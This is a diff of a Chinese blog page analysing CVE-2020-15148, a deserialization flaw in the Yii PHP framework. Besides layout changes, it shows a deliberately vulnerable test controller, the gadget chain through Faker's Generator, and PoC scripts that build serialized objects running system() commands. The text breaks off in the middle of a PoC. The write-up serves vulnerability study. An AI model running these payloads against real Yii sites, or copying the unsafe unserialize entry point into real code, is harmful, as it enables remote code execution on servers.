@@ -20,7 +20,7 @@
   <meta content="Scylamb&#39;s Blog" name="apple-mobile-web-app-title">
   <meta content="black-translucent" name="apple-mobile-web-app-status-bar-style">
   <meta content="telephone=no" name="format-detection">
-  <link rel="preload" href="/css/style.css?time=1635575084461" as="style">
+  <link rel="preload" href="/css/style.css?time=1635577490349" as="style">
   <!-- 页面元数据 -->
   <title>CVE-2020-15148 Yii反序列化漏洞 - Scylamb's Blog</title>
   <meta name="keywords" content="CVE-2020-15148,Blog">
@@ -2148,8 +2148,8 @@ ul.list-v >li>a:hover {
 }
 
   </style>
-  <link rel="stylesheet" href="/css/style.css?time=1635575084461" media="print" onload="this.media='all';this.onload=null">
-  <noscript><link rel="stylesheet" href="/css/style.css?time=1635575084461"></noscript>
+  <link rel="stylesheet" href="/css/style.css?time=1635577490349" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css?time=1635577490349"></noscript>
     <script>
       var userColorScheme=localStorage.getItem("user-color-scheme")
       if(userColorScheme){
@@ -2354,6 +2354,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
             
           
           
+            
+            
+              <li>
+                <a class="menuitem flat-box header toggle-mode-btn">
+                  <i class='fas fa-moon fa-fw'></i>暗黑模式
+                </a>
+              <li>
+            
+          
+          
 				</ul>
 			</div>
 
@@ -2483,6 +2493,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
                   </ul>
                 
               </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box header toggle-mode-btn">
+                  <i class='fas fa-moon fa-fw'></i>暗黑模式
+                </a>
+              <li>
             
           
             
@@ -2646,8 +2666,20 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>下载到本地后解压，修改<code>config/web.php</code>文件里<code>cookieValidationKey</code>的值</p>
 <p><img src=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/image-20210424202126193.png" class="lazyload" data-srcset=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/image-20210424202126193.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210424202126193"></p>
 <p>新建<code>config/controllers/TestControllers.php</code>添加一个反序列化的入口代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Yii</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionTest</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = Yii::<span class="variable">$app</span>-&gt;request-&gt;get(<span class="string">&#x27;unserialize&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> unserialize(base64_decode(<span class="variable">$name</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
 
+namespace app\controllers;
+
+use Yii;
+use yii\web\Controller;
+
+class TestController extends Controller&#123;
+    public function actionTest()&#123;
+        $name = Yii::$app-&gt;request-&gt;get(&#39;unserialize&#39;);
+        return unserialize(base64_decode($name));
+    &#125;
+&#125;
+</code></pre>
 <p>cd到根目录，<code>php yii serve --port=8888</code>,指定到8888端口运行[不指定则8080]</p>
 <p>访问：<code>http://localhost:8888/index.php?r=test/test&amp;unserialize=czoxMToiU2N5TGFtYlRlc3QiOw%3d%3d</code></p>
 <p><img src=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/image-20210424202519021.png" class="lazyload" data-srcset=".image/Yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90.image/image-20210424202519021.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210424202519021"></p>
@@ -2659,51 +2691,218 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>上图就是与cve-2020-15148相关的所有更新，可以看到就只是在yii\db\BatchQueryResult类里添加了一个__wakeup方法，有些朋友可能不太了解这个方法</p>
 <p>__wakeup方法在类被反序列化时会自动被调用，而这里这么写，目的就是在当BatchQueryResult类被反序列化时就直接报错，避免反序列化的发生，也就避免了漏洞</p>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// make sure cursor is closed</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;reset();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reset</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_dataReader !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_dataReader-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_dataReader = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_batch = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_value = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_key = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function __destruct()
+&#123;
+    // make sure cursor is closed
+    $this-&gt;reset();
+&#125;
 
+public function reset()
+&#123;
+    if ($this-&gt;_dataReader !== null) &#123;
+        $this-&gt;_dataReader-&gt;close();
+    &#125;
+    $this-&gt;_dataReader = null;
+    $this-&gt;_batch = null;
+    $this-&gt;_value = null;
+    $this-&gt;_key = null;
+&#125;
+</code></pre>
 <p>可见<code>__destruct()</code>函数调用了<code>reset()</code>方法，<code>reset()</code>方法中的<code>_dataReader</code>参数是可控的，并且调用了该参数的<code>close()</code>函数</p>
 <p>那么这里就可以作为跳板，去执行其他函数的<code>__call()</code></p>
 <p>全局搜索<code>__call</code>,出现了很多结果，但是最好利用的一个是<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code>,它的<code>__call</code>方法是这样的：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;format(<span class="variable">$method</span>, <span class="variable">$attributes</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">public function __call($method, $attributes)
+&#123;
+    return $this-&gt;format($method, $attributes);
+&#125;
+</code></pre>
 <p>跟进format:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getFormatter(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">public function format($formatter, $arguments = array())
+&#123;
+    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);
+&#125;
+</code></pre>
 <p>出现了<a target="_blank" rel="noopener" href="https://php.golaravel.com/function.call-user-func-array.html">call_user_func_array</a>()，继续跟进 getFormatter()</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$formatter</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;providers <span class="keyword">as</span> <span class="variable">$provider</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="variable">$provider</span>, <span class="variable">$formatter</span>)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>] = <span class="keyword">array</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">InvalidArgumentException</span>(sprintf(<span class="string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="variable">$formatter</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function getFormatter($formatter)
+&#123;
+    if (isset($this-&gt;formatters[$formatter])) &#123;
+        return $this-&gt;formatters[$formatter];
+    &#125;
+    foreach ($this-&gt;providers as $provider) &#123;
+        if (method_exists($provider, $formatter)) &#123;
+            $this-&gt;formatters[$formatter] = array($provider, $formatter);
 
+            return $this-&gt;formatters[$formatter];
+        &#125;
+    &#125;
+    throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));
+&#125;
+</code></pre>
 <p>可见：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="php">if (isset($this-&gt;formatters[$formatter])) &#123;
+        return $this-&gt;formatters[$formatter];
+    &#125;
+</code></pre>
 <p>目前<code>$formatter=&#39;close&#39;</code>,<code>$arguments</code>为空。<code>$formatter</code>传入了<code>$this-&gt;getFormatter</code>,在这个方法中，<code>$this-&gt;formatters</code>是可控的，这也就意味着<code>getFormatter</code>方法的返回值是可控的。</p>
 <p>也就是说<code>call_user_func_array</code>这个函数的第一个参数可控，第二个参数为空,所以我们这里可以调用任意类中的任意不带参数的方法了</p>
 <p>寻找可以实现任意代码执行或者间接实现任意代码执行的任意一个方法，并且参数是类的成员变量</p>
 <p>直接构造正则表达式搜索 <code>call_user_func_array</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">高级正则：</span><br><span class="line">call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</span><br><span class="line"></span><br><span class="line">普通正则：</span><br><span class="line">function \w+\(\) ?\s?\&#123;(.*?\s)+?call_user_func</span><br></pre></td></tr></table></figure>
+<pre><code>高级正则：
+call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)
 
+普通正则：
+function \w+\(\) ?\s?\&#123;(.*?\s)+?call_user_func
+</code></pre>
 <p>发现<code>yii\rest\CreateAction::run()</code>和<code>yii\rest\IndexAction::run()</code>这两个方法比较合适</p>
 <p><strong>yii\rest\CreateAction::run()</strong></p>
 <p><code>/vendor/yiisoft/yii2/rest/CreateAction.php</code>:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CreateAction</span></span>&#123;</span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">    ......</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checkAccess) &#123;</span><br><span class="line">            call_user_func(<span class="keyword">$this</span>-&gt;checkAccess, <span class="keyword">$this</span>-&gt;id);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">@var</span> $model \yii\db\ActiveRecord */</span></span><br><span class="line">        <span class="variable">$model</span> = <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;modelClass([</span><br><span class="line">            <span class="string">&#x27;scenario&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;scenario,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$model</span>-&gt;load(Yii::<span class="variable">$app</span>-&gt;getRequest()-&gt;getBodyParams(), <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$model</span>-&gt;save()) &#123;</span><br><span class="line">            <span class="variable">$response</span> = Yii::<span class="variable">$app</span>-&gt;getResponse();</span><br><span class="line">            <span class="variable">$response</span>-&gt;setStatusCode(<span class="number">201</span>);</span><br><span class="line">            <span class="variable">$id</span> = implode(<span class="string">&#x27;,&#x27;</span>, array_values(<span class="variable">$model</span>-&gt;getPrimaryKey(<span class="literal">true</span>)));</span><br><span class="line">            <span class="variable">$response</span>-&gt;getHeaders()-&gt;set(<span class="string">&#x27;Location&#x27;</span>, Url::toRoute([<span class="keyword">$this</span>-&gt;viewAction, <span class="string">&#x27;id&#x27;</span> =&gt; <span class="variable">$id</span>], <span class="literal">true</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="variable">$model</span>-&gt;hasErrors()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ServerErrorHttpException(<span class="string">&#x27;Failed to create the object for unknown reason.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$model</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">    ......</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+namespace yii\rest;
 
+class CreateAction&#123;
+    /** 
+    ......
+    */
+    public function run()
+    &#123;
+        if ($this-&gt;checkAccess) &#123;
+            call_user_func($this-&gt;checkAccess, $this-&gt;id);
+        &#125;
+
+        /* @var $model \yii\db\ActiveRecord */
+        $model = new $this-&gt;modelClass([
+            &#39;scenario&#39; =&gt; $this-&gt;scenario,
+        ]);
+
+        $model-&gt;load(Yii::$app-&gt;getRequest()-&gt;getBodyParams(), &#39;&#39;);
+        if ($model-&gt;save()) &#123;
+            $response = Yii::$app-&gt;getResponse();
+            $response-&gt;setStatusCode(201);
+            $id = implode(&#39;,&#39;, array_values($model-&gt;getPrimaryKey(true)));
+            $response-&gt;getHeaders()-&gt;set(&#39;Location&#39;, Url::toRoute([$this-&gt;viewAction, &#39;id&#39; =&gt; $id], true));
+        &#125; elseif (!$model-&gt;hasErrors()) &#123;
+            throw new ServerErrorHttpException(&#39;Failed to create the object for unknown reason.&#39;);
+        &#125;
+
+        return $model;
+    &#125;
+    /** 
+    ......
+    */
+&#125;
+?&gt;
+</code></pre>
 <p><code>$this-&gt;checkAccess</code>和<code>$this-&gt;id</code>都是直接可控的</p>
 <p>利用链：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\CreateAction::run()</span><br></pre></td></tr></table></figure>
-
+<pre><code>yii\db\BatchQueryResult::__destruct()
+-&gt;
+Faker\Generator::__call()
+-&gt;
+yii\rest\CreateAction::run()
+</code></pre>
 <p>poc1：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls -al&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="PHP">&lt;?php
+namespace yii\rest&#123;
+    class CreateAction&#123;
+        public $checkAccess;
+        public $id;
 
+        public function __construct()&#123;
+            $this-&gt;checkAccess = &#39;system&#39;;
+            $this-&gt;id = &#39;ls -al&#39;;
+        &#125;
+    &#125;
+&#125;
+
+namespace Faker&#123;
+    use yii\rest\CreateAction;
+
+    class Generator&#123;
+        protected $formatters;
+
+        public function __construct()&#123;
+            $this-&gt;formatters[&#39;close&#39;] = [new CreateAction, &#39;run&#39;];
+        &#125;
+    &#125;
+&#125;
+
+namespace yii\db&#123;
+    use Faker\Generator;
+
+    class BatchQueryResult&#123;
+        private $_dataReader;
+
+        public function __construct()&#123;
+            $this-&gt;_dataReader = new Generator;
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+    echo base64_encode(serialize(new yii\db\BatchQueryResult));
+&#125;
+?&gt;
+</code></pre>
 <p><strong>yii\rest\IndexAction::run()</strong></p>
 <p><code>vendor\yiisoft\yii2\rest\IndexAction.php</code>:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checkAccess) &#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;checkAccess, <span class="keyword">$this</span>-&gt;id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;prepareDataProvider();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">public function run()
+&#123;
+    if ($this-&gt;checkAccess) &#123;
+        call_user_func($this-&gt;checkAccess, $this-&gt;id);
+    &#125;
 
+    return $this-&gt;prepareDataProvider();
+&#125;
+</code></pre>
 <p><code>$this-&gt;checkAccess</code>以及<code>$this-&gt;id</code>都可控</p>
 <p>利益链：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
-
+<pre><code>yii\db\BatchQueryResult::__destruct()
+-&gt;
+Faker\Generator::__call()
+-&gt;
+yii\rest\IndexAction::run()
+</code></pre>
 <p>poc：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span 